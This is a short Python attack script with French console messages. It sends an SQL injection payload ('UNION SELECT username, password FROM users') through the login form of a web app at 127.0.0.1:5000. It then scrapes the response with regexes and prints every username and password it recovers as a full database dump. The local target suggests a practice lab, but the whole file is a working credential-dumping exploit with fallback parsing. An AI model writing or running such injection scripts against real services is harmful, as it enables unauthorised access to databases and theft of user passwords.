#!/usr/bin/env python3
import requests
import re
from datetime import datetime

URL = "http://127.0.0.1:5000"

print(f"[{datetime.now().strftime('%H:%M:%S')}]  SQL Injection - Dump Complet de la Base de Données")
print(f"   Cible : {URL}")
print("=" * 85)

session = requests.Session()

# Payload pour extraire TOUS les utilisateurs
payload = "' UNION SELECT username, password FROM users --"

data = {"username": payload, "password": "x"}

try:
    r = session.post(URL, data=data, timeout=6)
    response = r.text

    # Extraction du tableau avec regex plus robuste
    table_match = re.search(r'<table.*?</table>', response, re.DOTALL | re.IGNORECASE)

    if table_match:
        table_html = table_match.group(0)
        rows = re.findall(r'<tr><td>(.*?)</td><td>(.*?)</td></tr>', table_html)

        if rows:
            print(f"\n✅ {len(rows)} utilisateur(s) trouvé(s) dans users.db !\n")
            print("Utilisateur".ljust(20) + " | Mot de passe")
            print("-" * 55)
            for user, pwd in rows:
                print(f"{user.strip().ljust(20)} | {pwd.strip()}")
            print("-" * 55)
            print(f"\n Dump réussi ! Tous les utilisateurs ont été extraits avec succès.")
        else:
            print("⚠️ Tableau détecté mais aucune donnée extraite.")
    else:
        # Méthode de secours si pas de tableau
        print("⚠️ Aucun tableau trouvé. Tentative d'extraction alternative...\n")
        matches = re.findall(r'(\w+)\s*</td><td>([^<]+)', response)
        if matches:
            print(f"✅ {len(matches)} utilisateur(s) trouvé(s) :\n")
            print("Utilisateur".ljust(20) + " | Mot de passe")
            print("-" * 55)
            for user, pwd in matches:
                print(f"{user.strip().ljust(20)} | {pwd.strip()}")
        else:
            print("❌ Impossible d'extraire les données.")
            print("   L'injection a fonctionné mais le format de réponse est inattendu.")

except Exception as e:
    print(f"❌ Erreur : {e}")

print(f"\n[{datetime.now().strftime('%H:%M:%S')}] Fin du dump SQL Injection.")
